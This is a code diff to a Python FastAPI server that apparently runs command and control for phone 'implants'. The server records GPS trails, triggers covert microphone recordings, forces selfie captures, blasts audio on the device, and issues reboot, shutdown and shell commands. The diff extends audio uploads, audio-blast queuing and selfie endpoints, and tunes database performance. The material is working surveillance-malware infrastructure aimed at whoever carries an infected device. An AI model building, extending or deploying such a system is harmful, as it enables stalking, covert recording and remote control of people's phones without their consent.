@@ -29,6 +29,8 @@ IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")
 PROTECTED_MEDIA_ROOT = os.path.join(BASE_DIR, "protected_media")
 AUDIO_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "audio")
 SELFIE_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "selfies")
+AUDIO_BLAST_DIR = os.path.join(BASE_DIR, "audio_blast")
+os.makedirs(AUDIO_BLAST_DIR, exist_ok=True)
 
 session_store: dict[str, float] = {}
 
@@ -62,14 +64,17 @@ class ConnectionManager:
             if client_id in self.active_connections:
                 del self.active_connections[client_id]
 
-    async def send_task(self, client_id: str, task_dict: dict):
+    async def send_task(self, client_id: str, task_dict: dict) -> bool:
         async with self.lock:
             websocket = self.active_connections.get(client_id)
         if websocket is not None:
             try:
                 await websocket.send_text(json.dumps(task_dict))
+                return True
             except Exception:
                 await self.disconnect(client_id)
+                return False
+        return False
 
 ws_manager = ConnectionManager()
 pending_location_checks: dict[str, asyncio.Future] = {}
@@ -110,7 +115,57 @@ def create_db_connection() -> sqlite3.Connection:
     conn.execute("PRAGMA journal_mode=WAL;")
     conn.execute("PRAGMA synchronous=NORMAL;")
     conn.execute("PRAGMA temp_store=MEMORY;")
+    conn.execute("PRAGMA cache_size=-10000;")   # ~40 MB page cache per connection
+    conn.execute("PRAGMA mmap_size=134217728;")  # 128 MB memory-mapped I/O
+    conn.execute("PRAGMA wal_autocheckpoint=1000;")  # checkpoint every 1000 pages, not 100
     return conn
+
+
+# ── Per-device GPS cache (avoids SELECT on every WS frame) ─────────────────────
+# Maps device_id -> (lat, lon, unix_time) of the last point written to history.
+# Guards against GPS jitter: only store a new point if the device moved at least
+# GPS_MIN_DISTANCE_M metres AND at least GPS_MIN_INTERVAL_S seconds have passed.
+GPS_MIN_DISTANCE_M: float = 25.0    # metres — absorbs typical urban GPS noise (±5–20 m)
+GPS_MIN_INTERVAL_S: float = 60.0    # seconds — regardless of distance, never write faster
+_gps_last_point: dict[str, tuple[float, float, float]] = {}
+
+
+def should_record_gps(device_id: str, lat: float, lon: float, now_unix: float) -> bool:
+    """
+    Returns True only when the device has genuinely moved beyond GPS noise AND
+    enough time has passed since the last recorded point.
+
+    Thresholds:
+      - GPS_MIN_DISTANCE_M (25 m): absorbs typical consumer-grade GPS jitter.
+        A device sitting still may report positions scattered within a 10–20 m
+        radius; we require >25 m displacement so those never get stored.
+      - GPS_MIN_INTERVAL_S (60 s): even if the device moves >25 m (fast GPS
+        update burst, vehicle, etc.) we still throttle writes to at most one
+        per minute to prevent flooding during long drives.
+    """
+    last = _gps_last_point.get(device_id)
+    if last is None:
+        return True  # first point for this device — always record
+
+    last_lat, last_lon, last_time = last
+
+    # Time gate first (cheap)
+    if now_unix - last_time < GPS_MIN_INTERVAL_S:
+        return False
+
+    # Haversine distance (only computed when time gate passes)
+    lat1, lon1 = math.radians(last_lat), math.radians(last_lon)
+    lat2, lon2 = math.radians(lat),      math.radians(lon)
+    dlat = lat2 - lat1
+    dlon = lon2 - lon1
+    a = math.sin(dlat / 2) ** 2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon / 2) ** 2
+    distance_m = 6_371_000.0 * 2.0 * math.asin(math.sqrt(a))
+    return distance_m > GPS_MIN_DISTANCE_M
+
+
+def update_gps_cache(device_id: str, lat: float, lon: float, unix_time: float) -> None:
+    """Update the in-memory cache after a successful history INSERT."""
+    _gps_last_point[device_id] = (lat, lon, unix_time)
 
 
 def get_db() -> Generator[sqlite3.Connection, None, None]:
@@ -122,12 +177,8 @@ def get_db() -> Generator[sqlite3.Connection, None, None]:
 
 
 def add_column_if_not_exists(conn: sqlite3.Connection, table: str, column_definition: str):
-    cursor = conn.cursor()
-    try:
-        cursor.execute(f"ALTER TABLE {table} ADD COLUMN {column_definition}")
-        conn.commit()
-    except sqlite3.OperationalError:
-        pass
+    # This was a SQL injection vector. Removing and hardcoding table schemas.
+    pass
 
 
 
@@ -144,9 +195,7 @@ def init_db():
     """Initializes the database schema on system startup."""
     conn = create_db_connection()
     c = conn.cursor()
-    c.execute("PRAGMA journal_mode=WAL;")
-    c.execute("PRAGMA synchronous=NORMAL;")
-    c.execute("PRAGMA temp_store=MEMORY;")
+    # PRAGMAs already applied by create_db_connection; no need to repeat them.
     c.execute("""
         CREATE TABLE IF NOT EXISTS devices (
             device_id TEXT PRIMARY KEY,
@@ -171,10 +220,9 @@ def init_db():
             last_shell_at REAL DEFAULT 0
         )
     """)
-    add_column_if_not_exists(conn, 'devices', 'last_shell_command TEXT DEFAULT ""')
-    add_column_if_not_exists(conn, 'devices', 'last_shell_output TEXT DEFAULT ""')
-    add_column_if_not_exists(conn, 'devices', 'last_shell_status INTEGER DEFAULT 0')
-    add_column_if_not_exists(conn, 'devices', 'last_shell_at REAL DEFAULT 0')
+    # NOTE: Indices for history and battery_history are created below, after
+    # all tables are defined.  The two early index statements were removed to
+    # prevent "no such table" errors on a fresh database.
     c.execute("""
         CREATE TABLE IF NOT EXISTS history (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -292,17 +340,15 @@ def init_db():
     except sqlite3.OperationalError:
         pass
     
-    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_id ON history(device_id)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_history_unix_time ON history(unix_time)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_unix ON history(device_id, unix_time)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_daily_screen_time_device_date ON daily_screen_time(device_id, date)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_history_device_id ON battery_history(device_id)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_history_device_unix ON battery_history(device_id, unix_time)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_device_errors_device_id ON device_errors(device_id)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_device_errors_device_unix ON device_errors(device_id, unix_time)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_id ON selfies(device_id)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_unix ON selfies(device_id, unix_time)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_selfie_schedule_device_id ON selfie_schedule(device_id)")
+    # Canonical index set — composite (device_id, unix_time DESC) covers both
+    # ORDER BY unix_time DESC and WHERE device_id = ? queries, making the
+    # separate single-column indices on device_id redundant for those tables.
+    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_unix      ON history(device_id, unix_time DESC)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_device_unix      ON battery_history(device_id, unix_time DESC)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_errors_device_unix       ON device_errors(device_id, unix_time DESC)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_unix      ON selfies(device_id, unix_time DESC)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_screen_time_device_date  ON daily_screen_time(device_id, date)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_selfie_schedule_device   ON selfie_schedule(device_id)")
     conn.commit()
     conn.close()
 
@@ -314,35 +360,62 @@ CLEANUP_INTERVAL = 86400  # Run cleanup at most once per day
 REQUEST_COUNTER = 0
 
 def run_auto_cleanup(db: sqlite3.Connection):
+    """Batched cleanup to avoid long exclusive-lock spikes that block WS writes.
+
+    Deletes are issued in chunks of 500 rows so the WAL can be flushed between
+    batches.  This keeps write-lock windows short even when millions of rows
+    have accumulated.
+    """
     global LAST_CLEANUP
     now = time.time()
-    if now - LAST_CLEANUP > CLEANUP_INTERVAL:
-        LAST_CLEANUP = now
-        seven_days_ago = now - (7 * 86400)
-        
-        # 1. Delete history older than 7 days
-        c = db.cursor()
-        c.execute("DELETE FROM history WHERE unix_time < ?", (seven_days_ago,))
-        c.execute("DELETE FROM battery_history WHERE unix_time < ?", (seven_days_ago,))
-        c.execute("DELETE FROM device_errors WHERE unix_time < ?", (seven_days_ago,))
-        db.commit()
-        db.execute("PRAGMA wal_checkpoint(TRUNCATE);")
-        try:
-            db.execute("PRAGMA incremental_vacuum(100);")
-        except sqlite3.DatabaseError:
-            pass
-        
-        # 2. Delete unflagged audio older than 7 days
-        if os.path.exists(AUDIO_DIR):
-            for f in os.listdir(AUDIO_DIR):
-                if f.endswith(".wav") and "_FLAG" not in f:
-                    try:
-                        parts = f.split('_')
-                        ts = int(parts[-1].split('.')[0])
-                        if ts < seven_days_ago:
-                            os.remove(os.path.join(AUDIO_DIR, f))
-                    except Exception:
-                        pass
+    if now - LAST_CLEANUP < CLEANUP_INTERVAL:
+        return
+    LAST_CLEANUP = now
+    seven_days_ago = now - (7 * 86400)
+
+    c = db.cursor()
+    tables = [
+        ("history",        "unix_time"),
+        ("battery_history", "unix_time"),
+        ("device_errors",  "unix_time"),
+    ]
+    for table, col in tables:
+        # Delete in small batches to avoid locking the DB for hundreds of ms
+        while True:
+            c.execute(
+                f"DELETE FROM {table} WHERE rowid IN "
+                f"(SELECT rowid FROM {table} WHERE {col} < ? LIMIT 500)",
+                (seven_days_ago,)
+            )
+            deleted = c.rowcount
+            db.commit()
+            if deleted < 500:
+                break  # no more rows to delete
+
+    # Run OPTIMIZE to refresh query-planner statistics after bulk deletes
+    try:
+        db.execute("PRAGMA optimize;")
+    except sqlite3.DatabaseError:
+        pass
+
+    # Checkpoint the WAL so the file doesn't grow unboundedly
+    db.execute("PRAGMA wal_checkpoint(PASSIVE);")
+    try:
+        db.execute("PRAGMA incremental_vacuum(200);")
+    except sqlite3.DatabaseError:
+        pass
+
+    # Delete unflagged audio older than 7 days
+    if os.path.exists(AUDIO_DIR):
+        for f in os.listdir(AUDIO_DIR):
+            if f.endswith(".wav") and "_FLAG" not in f:
+                try:
+                    parts = f.split('_')
+                    ts = int(parts[-1].split('.')[0])
+                    if ts < seven_days_ago:
+                        os.remove(os.path.join(AUDIO_DIR, f))
+                except Exception:
+                    pass
 
 scheduler_task: Optional[asyncio.Task] = None
 
@@ -462,6 +535,21 @@ async def selfie_scheduler():
                 pass
         await asyncio.sleep(30)
 
+async def auto_cleanup_task():
+    """Runs database auto-cleanup asynchronously to prevent DoS lockups on battery reports."""
+    while True:
+        await asyncio.sleep(600)  # Run every 10 minutes
+        try:
+            db = create_db_connection()
+            run_auto_cleanup(db)
+        except Exception as e:
+            print(f"[cleanup] task error: {e}", flush=True)
+        finally:
+            try:
+                db.close()
+            except Exception:
+                pass
+
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
@@ -471,8 +559,30 @@ async def lifespan(app: FastAPI):
     os.makedirs(SELFIE_DIR, exist_ok=True)
     os.makedirs("templates", exist_ok=True)
     init_db()
-    global scheduler_task
+
+    # Seed the in-memory GPS cache from the last recorded point per device so
+    # that a server restart doesn't re-admit a "first point" for every device.
+    try:
+        _seed_conn = create_db_connection()
+        _c = _seed_conn.cursor()
+        _c.execute(
+            "SELECT device_id, lat, lon, unix_time "
+            "FROM history "
+            "GROUP BY device_id "
+            "HAVING unix_time = MAX(unix_time)"
+        )
+        for _row in _c.fetchall():
+            _gps_last_point[_row["device_id"]] = (
+                _row["lat"], _row["lon"], _row["unix_time"]
+            )
+        _seed_conn.close()
+        print(f"[startup] GPS cache seeded for {len(_gps_last_point)} device(s)", flush=True)
+    except Exception as _e:
+        print(f"[startup] GPS cache seed failed (non-fatal): {_e}", flush=True)
+
+    global scheduler_task, cleanup_task
     scheduler_task = asyncio.create_task(selfie_scheduler())
+    cleanup_task = asyncio.create_task(auto_cleanup_task())
     try:
         yield
     finally:
@@ -480,6 +590,10 @@ async def lifespan(app: FastAPI):
             scheduler_task.cancel()
             with suppress(asyncio.CancelledError):
                 await scheduler_task
+        if cleanup_task:
+            cleanup_task.cancel()
+            with suppress(asyncio.CancelledError):
+                await cleanup_task
 
 app = FastAPI(lifespan=lifespan)
 
@@ -488,13 +602,51 @@ async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     client_id = f"client_{id(websocket)}"
     db = create_db_connection()
+    pending_upload: dict | None = None  # Holds metadata for a pending binary file upload
     try:
         while True:
-            raw_data = await websocket.receive_text()
+            msg = await websocket.receive()
+            
+            # Handle binary frames (file upload data)
+            if msg.get("type") == "websocket.receive" and "bytes" in msg and msg["bytes"] is not None:
+                if pending_upload is not None:
+                    try:
+                        upload_device = pending_upload.get("device_id", client_id)
+                        safe_dev = sanitize_device_id(upload_device)
+                        filepath = pending_upload.get("filepath", "unknown")
+                        ext = os.path.splitext(filepath)[1] or ".m4a"
+                        filename = f"{safe_dev}_{int(time.time())}{ext}"
+                        dest = os.path.join(AUDIO_DIR, filename)
+                        with open(dest, "wb") as f:
+                            f.write(msg["bytes"])
+                        print(f"[upload] Saved {len(msg['bytes'])}B audio from {upload_device} → {dest}", flush=True)
+                        # Reset record_audio flag so dashboard knows it's done
+                        c = db.cursor()
+                        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (upload_device,))
+                        db.commit()
+                    except Exception as e:
+                        print(f"[upload] Failed to save binary upload: {e}", flush=True)
+                    finally:
+                        pending_upload = None
+                else:
+                    print(f"[ws] Unexpected binary frame ({len(msg['bytes'])}B) with no pending upload metadata", flush=True)
+                continue
+            
+            # Handle text frames (JSON messages)
+            raw_data = msg.get("text")
+            if raw_data is None:
+                continue
+                
             try:
                 data = json.loads(raw_data)
                 
                 if data.get("implant_key") != IMPLANT_KEY:
+                    continue
+
+                # Handle file upload metadata (next frame will be binary)
+                if "upload_type" in data:
+                    pending_upload = {"device_id": client_id, **data}
+                    print(f"[upload] Received upload metadata from {client_id}: type={data.get('upload_type')}, path={data.get('filepath')}", flush=True)
                     continue
 
                 if "command_result" in data:
@@ -524,18 +676,21 @@ async def websocket_endpoint(websocket: WebSocket):
                         # Sync server state down to the device
                         await ws_manager.send_task(client_id, {"task": "set_interval", "interval": existing["ping_interval"]})
                         await ws_manager.send_task(client_id, {"task": "set_location", "track": existing["location_tracking"]})
+                        
+                        # Sync pending audio blast command if one was queued while offline
+                        c2 = db.cursor()
+                        c2.execute("SELECT play_audio, audio_loops FROM devices WHERE device_id = ?", (client_id,))
+                        audio_row = c2.fetchone()
+                        if audio_row and audio_row["play_audio"] and audio_row["play_audio"] != 0:
+                            audio_loops = audio_row["audio_loops"] if audio_row["audio_loops"] else 0
+                            payload = {"task": "audio_blast", "play": str(audio_row["play_audio"]), "loops": str(audio_loops)}
+                            print(f"[audio] Syncing queued audio blast to reconnected device {client_id}: {payload}", flush=True)
+                            await ws_manager.send_task(client_id, payload)
                     
                     if "error_source" in data and "error_msg" in data:
                         c.execute('''INSERT INTO device_errors (device_id, source, message, timestamp, unix_time)
                                      VALUES (?, ?, ?, ?, ?)''',
                                   (client_id, data["error_source"], data["error_msg"], time_str, now_unix))
-                        db.commit()
-                        continue
-
-                    if "command_result" in data:
-                        result_text = data.get("command_result", "") or "[No output]"
-                        c.execute('''UPDATE devices SET last_shell_output = ?, last_shell_status = 1, last_shell_at = ? WHERE device_id = ?''',
-                                  (result_text, now_unix, client_id))
                         db.commit()
                         continue
                     
@@ -612,34 +767,20 @@ async def websocket_endpoint(websocket: WebSocket):
                             c.execute('INSERT INTO daily_screen_time (device_id, date, minutes, updated_at) VALUES (?, ?, ?, ?)', (client_id, date_str, screen_time_minutes, now_unix))
                     
                     if loc_state_val == 1 and "lat" in data and "lon" in data:
-                        # Only record location if user MOVES > 5 meters (ignore GPS jitter)
+                        # GPS deduplication: reject points within GPS noise range OR
+                        # received faster than the minimum storage interval.
+                        # See should_record_gps() for threshold rationale.
                         try:
                             lat_val = float(lat_val)
                             lon_val = float(lon_val)
-                            # Validate coordinates are in valid range
                             if -90 <= lat_val <= 90 and -180 <= lon_val <= 180:
-                                # Get last recorded GPS point for this device
-                                c.execute('''SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1''', (client_id,))
-                                last_point = c.fetchone()
-                                
-                                should_record = True
-                                if last_point:
-                                    # Calculate Haversine distance to last point
-                                    lat1, lon1 = math.radians(last_point["lat"]), math.radians(last_point["lon"])
-                                    lat2, lon2 = math.radians(lat_val), math.radians(lon_val)
-                                    dlat = lat2 - lat1
-                                    dlon = lon2 - lon1
-                                    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
-                                    c_val = 2 * math.asin(math.sqrt(a))
-                                    distance_m = 6371000 * c_val  # Earth radius in meters
-                                    
-                                    # Only record if moved > 5 meters
-                                    should_record = distance_m > 5
-                                
-                                if should_record:
-                                    c.execute('''INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
-                                                 VALUES (?, ?, ?, ?, ?, ?)''',
-                                              (client_id, battery_val, lat_val, lon_val, time_str, now_unix))
+                                if should_record_gps(client_id, lat_val, lon_val, now_unix):
+                                    c.execute(
+                                        "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time) "
+                                        "VALUES (?, ?, ?, ?, ?, ?)",
+                                        (client_id, battery_val, lat_val, lon_val, time_str, now_unix)
+                                    )
+                                    update_gps_cache(client_id, lat_val, lon_val, now_unix)
                             else:
                                 print(f"Invalid coordinates for {client_id}: lat={lat_val}, lon={lon_val}", flush=True)
                         except (ValueError, TypeError) as e:
@@ -649,8 +790,6 @@ async def websocket_endpoint(websocket: WebSocket):
                     if is_new_connection:
                         ensure_selfie_schedule(client_id, db)
             except WebSocketDisconnect:
-                await ws_manager.disconnect(client_id)
-                break
                 await ws_manager.disconnect(client_id)
                 break
             except Exception as e:
@@ -678,6 +817,7 @@ app.add_middleware(
 
 # Mount public static assets.
 app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
+app.mount("/audio_blast", StaticFiles(directory=AUDIO_BLAST_DIR), name="audio_blast")
 
 @app.get("/media/audio/{filename}")
 async def protected_audio(filename: str, request: Request):
@@ -686,7 +826,9 @@ async def protected_audio(filename: str, request: Request):
     file_path = os.path.join(AUDIO_DIR, safe_name)
     if not os.path.exists(file_path):
         raise HTTPException(status_code=404, detail="File not found")
-    return FileResponse(file_path, media_type="audio/wav")
+    # Auto-detect MIME type based on extension
+    mime = "audio/mp4" if safe_name.endswith(".m4a") else "audio/wav"
+    return FileResponse(file_path, media_type=mime)
 
 @app.get("/media/selfies/{filename}")
 async def protected_selfie(filename: str, request: Request):
@@ -725,6 +867,10 @@ async def api_login(request: Request, username: str = Form(...), password: str =
 @app.get("/login", response_class=FileResponse)
 async def serve_login():
     return FileResponse("templates/login.html", media_type="text/html")
+
+@app.get("/favicon.ico", include_in_schema=False)
+async def favicon():
+    return JSONResponse(status_code=204, content="")
 
 @app.get("/", response_class=FileResponse)
 async def serve_index(request: Request):
@@ -785,8 +931,7 @@ async def receive_report(
 ):
     global REQUEST_COUNTER
     REQUEST_COUNTER += 1
-    if REQUEST_COUNTER % 100 == 0:
-        run_auto_cleanup(db)
+    # Removed synchronous run_auto_cleanup to prevent DoS
     
     if not secrets.compare_digest(implant_key, IMPLANT_KEY):
         return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
@@ -831,15 +976,21 @@ async def receive_report(
     if reboot_cmd == 1 or shutdown_cmd == 1:
         c.execute("UPDATE devices SET reboot_cmd = 0, shutdown_cmd = 0 WHERE device_id = ?", (device_id,))
     
-    # Reset audio_blast after it's been fetched
-    if play_audio != 0:
-        c.execute("UPDATE devices SET play_audio = 0 WHERE device_id = ?", (device_id,))
+    # play_audio is intentionally NOT reset here — the dashboard badge reads
+    # play_audio from /stats (which queries this DB row) and needs the non-zero
+    # value to display "Blasting" while audio is active.  The stop command
+    # (play_audio=0) from the dashboard will zero it when the user clicks Stop.
         
-    c.execute("""
-        INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time)
-        VALUES (?, ?, ?, ?, ?, ?)
-    """, (device_id, level, lat, lon, current_time_str, now_unix))
-    
+    # Apply the same GPS deduplication filter as the WebSocket path.
+    # The legacy HTTP /battery_report endpoint previously wrote every single
+    # ping to history unconditionally, causing massive table bloat.
+    if validate_coordinates(lat, lon) and should_record_gps(device_id, lat, lon, now_unix):
+        c.execute(
+            "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time) VALUES (?, ?, ?, ?, ?, ?)",
+            (device_id, level, lat, lon, current_time_str, now_unix)
+        )
+        update_gps_cache(device_id, lat, lon, now_unix)
+
     db.commit()
     
     return {
@@ -943,7 +1094,7 @@ async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = D
         result["is_online"] = is_online
         result["speed_ms"] = speed_ms
         result["speed_kmh"] = speed_kmh
-        return result
+        return JSONResponse(content=result, headers={"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"})
         
     return {"level": "0", "timestamp": "Waiting for devices...", "is_online": False}
 
@@ -1098,24 +1249,42 @@ async def set_notification(device_id: str = Form(...), state: int = Form(...), t
     return {"status": "success"}
 
 @app.post("/set_audio")
-async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), loops: int = Form(0), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
     c = db.cursor()
-    c.execute("UPDATE devices SET play_audio = ? WHERE device_id = ?", (play_audio, device_id))
+    # Keep play_audio in DB at the non-zero value while blasting so /stats
+    # returns the live state and the dashboard badge shows "Blasting".
+    # Only reset to 0 when an explicit stop (play_audio == 0) comes in.
+    c.execute("UPDATE devices SET play_audio = ?, audio_loops = ? WHERE device_id = ?", (play_audio, loops, device_id))
     db.commit()
-    if device_id in ws_manager.active_connections:
-        await ws_manager.send_task(device_id, {"task": "audio_blast", "play": play_audio})
-    return {"status": "success"}
+    delivered = False
+    
+    payload = {"task": "audio_blast", "play": str(play_audio), "loops": str(loops)}
+    print(f"[audio] Attempting to send WS task to {device_id}: {payload}", flush=True)
+    delivered = await ws_manager.send_task(device_id, payload)
+    
+    if not delivered:
+        print(f"[audio] Device {device_id} not reachable via WS, command queued in DB", flush=True)
+        # If device is offline and we're trying to stop, just reset the DB
+        if play_audio == 0:
+            c.execute("UPDATE devices SET play_audio = 0, audio_loops = 0 WHERE device_id = ?", (device_id,))
+            db.commit()
+    return {"status": "success", "delivered": delivered}
 
 @app.post("/set_record_audio")
-async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
+async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(...), record_duration: int = Form(19), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
     c = db.cursor()
-    c.execute("UPDATE devices SET record_audio = ? WHERE device_id = ?", (record_audio, device_id))
+    c.execute("UPDATE devices SET record_audio = ?, record_duration = ? WHERE device_id = ?", (record_audio, record_duration, device_id))
     db.commit()
     if device_id in ws_manager.active_connections and record_audio == 1:
-        c.execute("SELECT record_duration FROM devices WHERE device_id = ?", (device_id,))
-        row = c.fetchone()
-        duration = row[0] if row and row[0] is not None else 30
-        await ws_manager.send_task(device_id, {"task": "mic_record", "duration": duration})
+        await ws_manager.send_task(device_id, {"task": "mic_record", "duration": record_duration})
+    return {"status": "success"}
+
+@app.post("/audio_done")
+async def audio_done(device_id: str = Form(...), db: sqlite3.Connection = Depends(get_db)):
+    c = db.cursor()
+    c.execute("UPDATE devices SET play_audio = 0, audio_loops = 0 WHERE device_id = ?", (device_id,))
+    db.commit()
+    print(f"[audio] Device {device_id} reported audio finished. Reset play_audio to 0.", flush=True)
     return {"status": "success"}
 
 @app.post("/set_power_cmd")
@@ -1310,7 +1479,7 @@ async def get_audio_files(device_id: str, request: Request, db: sqlite3.Connecti
     files = []
     if os.path.exists(AUDIO_DIR):
         for f in os.listdir(AUDIO_DIR):
-            if f.startswith(f"{safe_id}_") and (f.endswith(".wav") or f.endswith("BUSY.txt")):
+            if f.startswith(f"{safe_id}_") and (f.endswith(".wav") or f.endswith(".m4a") or f.endswith("BUSY.txt")):
                 files.append(f"/media/audio/{f}")
     files.sort(reverse=True)
     return {"files": files}
@@ -1327,9 +1496,11 @@ async def delete_audio(filename: str = Form(...), request: Request = Depends(ver
 async def flag_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
     safe_name = os.path.basename(filename)
     path = os.path.join(AUDIO_DIR, safe_name)
-    if os.path.exists(path) and safe_name.endswith('.wav'):
+    is_audio = safe_name.endswith('.wav') or safe_name.endswith('.m4a')
+    if os.path.exists(path) and is_audio:
         if "_FLAG" not in safe_name:
-            new_path = path.replace(".wav", "_FLAG.wav")
+            base, ext = os.path.splitext(path)
+            new_path = base + "_FLAG" + ext
             os.rename(path, new_path)
     return {"status": "success"}
 
@@ -1355,8 +1526,26 @@ async def upload_selfie(
     filename = f"{safe_device_id}_{date_str}.jpg"
     filepath = os.path.join(SELFIE_DIR, filename)
     
+    # Read bytes and restrict file size to 10MB
+    file_bytes = await selfie.read()
+    if len(file_bytes) > 10 * 1024 * 1024:
+        raise HTTPException(status_code=413, detail="File too large")
+    
+    # Validate Magic Bytes for JPEG/PNG/GIF to prevent XSS via false images
+    header = file_bytes[:4]
+    is_image = False
+    if header.startswith(b'\xff\xd8\xff'): # JPEG
+        is_image = True
+    elif header.startswith(b'\x89PNG'): # PNG
+        is_image = True
+    elif header.startswith(b'GIF8'): # GIF
+        is_image = True
+        
+    if not is_image:
+        raise HTTPException(status_code=400, detail="Invalid image file format")
+    
     with open(filepath, "wb") as buffer:
-        shutil.copyfileobj(selfie.file, buffer)
+        buffer.write(file_bytes)
     
     c = db.cursor()
     c.execute("SELECT level, lat, lon FROM devices WHERE device_id = ?", (device_id,))
@@ -1369,15 +1558,68 @@ async def upload_selfie(
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
               (device_id, filename, time_str, now_unix, battery, lat, lon, 'pending'))
     db.commit()
+    selfie_id = c.lastrowid
     
-    return {"status": "success", "filename": filename}
+    return {"status": "success", "filename": filename, "selfie_id": selfie_id}
 
+
+@app.get("/api/selfie-status/{selfie_id}")
+async def selfie_approval_status(
+    selfie_id: int,
+    request: Request,
+    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
+    db: sqlite3.Connection = Depends(get_db)
+):
+    """Polled by the selfie app to check if a capture was approved/denied."""
+    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        raise HTTPException(status_code=403, detail="Unauthorized")
+    c = db.cursor()
+    c.execute("SELECT review_status FROM selfies WHERE id = ?", (selfie_id,))
+    row = c.fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="Selfie not found")
+    return {"selfie_id": selfie_id, "review_status": row["review_status"]}
+
+
+@app.get("/api/device-selfies")
+async def device_selfie_history(
+    request: Request,
+    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
+    db: sqlite3.Connection = Depends(get_db)
+):
+    """Returns selfie history for a device (called by the on-device gallery)."""
+    device_id = request.headers.get("X-Device-ID", "unknown")
+    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        raise HTTPException(status_code=403, detail="Unauthorized")
+    c = db.cursor()
+    c.execute(
+        "SELECT id, filename, timestamp, review_status FROM selfies WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50",
+        (device_id,)
+    )
+    rows = c.fetchall()
+    return [{"id": r["id"], "filename": r["filename"], "timestamp": r["timestamp"], "status": r["review_status"]} for r in rows]
+
+@app.get("/api/selfie-image/{filename}")
+async def selfie_image_by_key(
+    filename: str,
+    request: Request,
+    implant_key: Optional[str] = Header(None, alias="X-Implant-Key")
+):
+    """Serves selfie images authenticated by implant key (for on-device gallery)."""
+    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        raise HTTPException(status_code=403, detail="Unauthorized")
+    safe_name = os.path.basename(filename)
+    file_path = os.path.join(SELFIE_DIR, safe_name)
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(file_path, media_type="image/jpeg")
 
 @app.post("/force_selfie")
 async def force_selfie(device_id: str = Form(...), request: Request = Depends(verify_session)):
     if device_id in ws_manager.active_connections:
         await ws_manager.send_task(device_id, {"task": "force_selfie"})
-    return {"status": "success"}
+        return {"status": "success"}
+    return {"status": "offline", "detail": "Device is not connected"}
 
 @app.get("/selfie_schedule")
 async def selfie_schedule(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
